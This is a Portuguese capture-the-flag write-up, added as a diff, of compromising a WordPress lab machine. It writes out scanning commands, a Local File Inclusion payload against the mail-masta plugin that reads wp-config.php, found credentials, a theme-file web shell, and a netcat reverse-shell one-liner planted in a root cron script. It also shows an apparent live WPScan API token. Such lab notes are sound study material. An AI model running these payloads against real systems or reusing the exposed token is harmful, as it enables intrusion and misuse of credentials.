@@ -1,0 +1,169 @@
+DESCOBRINDO PORTAS ABERTAS:
+--> rustscan -a 10.67.190.53 --> portas abertas
+
+DESCOBRINDO ACESSOS NORMAIS (FTP:FTP ANONYMOUS:ANONYMOUS)
+--> sudo nmap -sC -Pn -p 21,22,80 10.67.190.53 --> rodando scripts nas portas
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.200.114
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+22/tcp open  ssh
+| ssh-hostkey: 
+|   3072 c0:9b:c1:cf:98:92:a9:1a:da:44:02:47:6a:82:b6:17 (RSA)
+|   256 a8:1c:df:18:98:7e:fb:3b:b5:f4:47:28:41:ed:46:b3 (ECDSA)
+|_  256 a4:c7:6d:fe:75:2c:e9:11:69:48:72:64:97:5b:5d:7c (ED25519)
+80/tcp open  http
+|_http-title: Apache2 Ubuntu Default Page: It works
+
+
+
+DIRETÓRIOS:
+
+--> ffuf -u http://10.67.190.53/FUZZ -H "Host: 10.67.190.53" -w /home/nanoxsec/Downloads/wordlists/admin.txt -i -c -ic -mc 200,301,401
+
+wordpress
+hackathons -> contém a possível senha da elyana quando se olha o código fonte da página
+	      |_> elyana:H@ckme@123
+
+USERNAMES -> /wordpress
+
+elyana
+
+
+ENUMERAÇÃO COM WPSCAN (USUÁRIOS):
+
+--> wpscan --url http://10.67.190.53/wordpress/ --api-token=Z3ZLVtBWnRzVZK1khIxO2NPqEJuIzttCRCmuMficshc --enumerate u
+
+[i] User(s) Identified:
+
+[+] elyana
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://10.67.190.53/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+--> Existe apenas um usuário: elyana
+
+ENUMERAÇÃO COM WPSCAN (PLUGINS VULNERÁVEIS):
+
+--> wpscan --url http://10.67.190.53/wordpress/ --api-token=Z3ZLVtBWnRzVZK1khIxO2NPqEJuIzttCRCmuMficshc --enumerate vp
+
+[i] Plugin(s) Identified:
+
+[+] mail-masta
+ | Location: http://10.67.190.53/wordpress/wp-content/plugins/mail-masta/
+ | Latest Version: 1.0 (up to date)
+ | Last Updated: 2014-09-19T07:52:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | [!] 2 vulnerabilities identified:
+ |
+ | [!] Title: Mail Masta <= 1.0 - Unauthenticated Local File Inclusion (LFI)
+ |     References:
+ |      - https://wpscan.com/vulnerability/5136d5cf-43c7-4d09-bf14-75ff8b77bb44
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10956
+ |      - https://www.exploit-db.com/exploits/40290/
+ |      - https://www.exploit-db.com/exploits/50226/
+ |      - https://cxsecurity.com/issue/WLB-2016080220
+
+--> Plugin vulnerável: mail masta versão 1.0
+	|_> Vulnerabilidades: Local File Inclusion e SQLinjection
+	|_> Irei explorar essa: Local File Inclusion
+POC: https://site.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd --> lfi triggado!
+
+EXPLORAÇÃO:
+
+Site é em wordpress e o CMS está no github: https://github.com/WordPress/WordPress
+olhei as pastas do wordpress e fui navegando entre elas até encontrar essa: wp-config.php onde tive acesso as credenciais de usuário!
+
+--> https://site.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
+
+db_name: wordpress
+db_user: elyana
+db_password: H@ckme@123
+
+
+LOGANDO NO SISTEMA COM AS CREDÊNCIAIS:
+
+elyana:H@ckme@123 --> Logado com sucesso!
+
+PEGANDO UMA SHELL REVERSA (ENTRANDO NO SERVIDOR):
+
+Ganhei acesso administrativo ao site com as credênciais da elyana, então editei o
+tema twentytwenty/404.php onde substitui o conteúdo do arquivo php pelo conteúdo
+da minha shell! Abri a página e ganhei acesso ao servidor
+
+Abrindo uma porta no meu computador para receber a conexão
+--> ncat -vnlp 1337 
+--> url da shell upada: http://10.67.190.53/wordpress/wp-content/themes/twentytwenty/404.php
+
+MELHORANDO A SHELL INTERATIVA:
+
+--> python3 -c 'import pty;pty.spawn("/bin/bash")'
+	|_> Aqui eu utilizei o python para puxar uma shell interativa melhor!
+--> export TERM=xterm
+	|_> Aqui eu adicionei o "clear" para o terminal
+	
+PROCURANDO A FLAG DE USUÁRIO:
+
+--> find / -name user.txt 2>/dev/null
+--> find / -type f -iname "*user*" 2>/dev/null
+
+--> VIRANDO ROOT:
+
+cat crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *    * * *   root    /var/backups/script.sh
+
+--> Usuário root roda o script em backup que puxa uma shell interativa como root. Meu usuário www-data tem permissão de escrita
+então vou adicionar a chamada da shell nesse arquivo e receber acesso root:
+
+--> Chamada de shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.200.114 1336 >/tmp/f
+--> a Crontab rodou e eu ganhei acesso root! Agora vou pegar as duas flags e vencer o desafio!!
+
+FLAG 1 (USUÁRIO): THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
+FLAG 2 (ROOT): THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
+
+CTF FINALIZADO!
+
+
+
+
+
+
+
+
+
+
+
+
